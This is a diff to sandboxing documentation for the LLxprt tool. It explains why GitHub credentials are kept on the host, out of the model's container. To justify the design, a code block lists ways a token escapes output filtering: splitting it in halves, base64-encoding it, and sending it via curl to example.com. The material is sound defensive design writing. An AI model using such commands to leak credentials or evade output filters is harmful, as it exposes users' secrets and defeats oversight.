@@ -27,10 +27,14 @@ Container sandboxing (Docker or Podman) runs LLxprt's tool execution inside an i
 
 ## Using GitHub from a Sandbox
 
-No GitHub credential is placed in the container, so `gh` inside the sandbox is
-not authenticated. Use the [`github` tool](./tools/github.md) instead: the model
-names an operation, the host runs `gh`, and shaped results come back. The
-credential stays on the host.
+> **Applies to Docker and Podman.** Seatbelt has no credential isolation — it
+> runs on the host with your full keyring — so nothing below describes a
+> boundary under Seatbelt. Use a container engine if this matters to you.
+
+With Docker or Podman, no GitHub credential is placed in the container, so `gh`
+inside the sandbox is not authenticated. Use the
+[`github` tool](./tools/github.md) instead: the model names an operation, the
+host runs `gh`, and shaped results come back. The credential stays on the host.
 
 This covers issues, pull requests, reviews, checks and labels, including
 blocking on CI with `pr.checks` and `watch: true`. The tool works the same way
@@ -42,7 +46,7 @@ An obvious alternative is to inject the token as an environment variable and
 strip it out of command output. That does not work, and it is worth recording
 why so it is not proposed again:
 
-```sh
+```bash
 echo ${GH_TOKEN:0:20}; echo ${GH_TOKEN:20}   # neither half matches a filter
 echo $GH_TOKEN | base64                      # or rev, or md5
 curl -H "Authorization: bearer $GH_TOKEN" example.com   # never touches stdout
